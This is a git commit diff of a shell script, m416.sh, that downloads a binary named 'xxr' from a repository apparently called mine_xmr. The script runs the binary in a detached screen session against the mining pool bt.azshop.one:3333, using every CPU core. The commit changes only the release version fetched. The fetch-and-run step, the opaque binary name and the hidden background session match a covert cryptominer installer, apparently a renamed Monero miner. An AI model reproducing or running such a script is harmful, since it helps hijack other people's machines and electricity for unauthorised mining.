d85c579140ad2d0b75b8b2e813a0b8fd5a670195
yuqingkj <42601051+yuqingkj@users.noreply.github.com>
2025-07-04 17:29:54 +0800

    Update m416.sh

--- m416.sh
+++ m416.sh
@@ -4,7 +4,7 @@ apt-get update
 apt-get -y install libhwloc15
 mkdir xxr
 cd ./xxr
-wget https://github.com/yuqingkj/mine_xmr/releases/download/6.22.0/xxr
+wget https://github.com/yuqingkj/mine_xmr/releases/download/6.24.0/xxr
 chmod 777 ./xxr
 screen -dmS xxr
 screen -x -S xxr -p 0 -X stuff "./xxr -o bt.azshop.one:3333 --rig-id az -t $(nproc) \n"
